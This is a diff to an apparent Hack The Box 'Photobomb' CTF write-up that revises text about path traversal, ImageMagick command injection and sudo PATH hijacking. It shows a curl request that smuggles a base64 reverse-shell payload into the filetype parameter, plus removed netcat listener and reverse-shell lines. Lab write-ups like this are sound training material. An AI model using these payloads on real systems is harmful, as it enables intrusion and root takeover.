@@ -274,7 +274,7 @@ photo=<IMAGE_LINK>&filetype=<FILETYPE>&dimensions=<WIDTH>x<HEIGHT>
 I replayed this request on Burp Suite to study the behavior of the website.
 
 If I send an invalid `photo` parameter, the response is
-`Source photo does not exist.`. However, I can freely edit the `filetype` and
+'Source photo does not exist.'. However, I can freely edit the `filetype` and
 `dimensions` parameters, as long as `filetype` is prefixed with `png` or `jpg`,
 and `dimensions` are valid.
 
@@ -295,7 +295,7 @@ image we select.
 #### Path traversal
 
 I tried to enter `../../../../../../etc/passwd` after the `photo` parameter, but
-the response is `Invalid photo.`. It looks like there's some sort of validation
+the response is 'Invalid photo.'. It looks like there's some sort of validation
 for the filetype, so unfortunately we can't read any file on the filesystem.
 
 #### OS command injection
@@ -311,8 +311,8 @@ execute our own commands.
 The same goes for the `dimensions` parameter.
 
 However, the `filetype` parameter is considered valid as long as it starts with
-`jpg` or `png. If we add a command after a valid prefix, the result is
-`Failed to generate a copy of voicu-apostol-MWER49YaD-M-unsplash.jpg`, so it
+`jpg` or `png`. If we add a command after a valid prefix, the result is
+'Failed to generate a copy of voicu-apostol-MWER49YaD-M-unsplash.jpg', so it
 likely worked!
 
 If we send an extra request with `sleep 10` as the command, there's a 10 seconds
@@ -323,7 +323,7 @@ worked!
 
 Since the website uses ImageMagick to dynamically convert and resize the image
 based on user-controllable inputs, and it fails to properly sanitize the
-`filetype` parameter, we can fiddle with this parameter to obtain RCE.
+`filetype` parameter, we can craft a payload to obtain RCE.
 
 ### Preparation
 
@@ -346,7 +346,7 @@ I'll save it as the `BASE64_REVSHELL_PAYLOAD` shell variable.
 Let's send a request to Photobomb to execute our payload.
 
 ```sh
-❯ curl -s -o "/dev/null" -H "Authorization: Basic cEgwdDA6YjBNYiE=" "http://photobomb.htb/printer" -X "POST" --data-urlencode "photo=voicu-apostol-MWER49YaD-M-unsplash.jpg" --data-urlencode "filetype=jpg; /bin/echo $BASE64_REVSHELL_PAYLOAD | /usr/bin/base64 -d | /bin/bash -i" --data-urlencode "dimensions=3000x2000"
+❯ curl -s -o "/dev/null" -H "Authorization: Basic cEgwdDA6YjBNYiE=" "http://photobomb.htb/printer" -X "POST" --data-urlencode "photo=voicu-apostol-MWER49YaD-M-unsplash.jpg" --data-urlencode "filetype=jpg;/bin/echo $BASE64_REVSHELL_PAYLOAD | /usr/bin/base64 -d | /bin/bash -i" --data-urlencode "dimensions=3000x2000"
 ```
 
 If we check our listener:
@@ -692,45 +692,32 @@ perform a path hijacking attack!
 
 ### Preparation
 
-The goal is to obtain a reverse shell.
+The goal is to obtain an elevated shell.
 
-First, I'll setup a listener to receive the shell.
-
-```sh
-❯ rlwrap nc -lvnp "9002"
-```
-
-Then, I'll choose the Base64 encoded version of the 'Bash -i' payload from
-[RevShells](https://www.revshells.com/) configured to obtain a `/bin/bash`
-shell.
-
-### Exploitation
-
-I'll create a `find` script in `/tmp` to execute this command:
+I'll create a `find` script in `/tmp` to execute `/bin/bash`:
 
 ```sh
 #!/bin/bash
 
-/bin/echo <BASE64_REVSHELL_PAYLOAD> | /usr/bin/base64 -d | /bin/bash -i
+/bin/bash -i
 ```
 
-Then, let's make it executable.
+Then, I'll make it executable.
 
-Finally, let's abuse our `sudo` permissions to execute the `/opt/cleanup.sh`
-file as `root`, while specifying a custom `PATH` environment variable:
+### Exploitation
+
+Let's abuse our `sudo` permissions to execute the `/opt/cleanup.sh` file as
+`root`, while specifying a custom `PATH` environment variable:
 
 ```sh
 wizard@photobomb:~$ sudo "PATH=/tmp:$PATH" "/opt/cleanup.sh"
 ```
 
-If we check our listener:
-
 ```
-connect to [10.10.14.10] from (UNKNOWN) [10.10.11.182] 38224
 root@photobomb:/home/wizard/photobomb#
 ```
 
-It caught the reverse shell!
+Yay!
 
 ### Stabilizing the shell
 
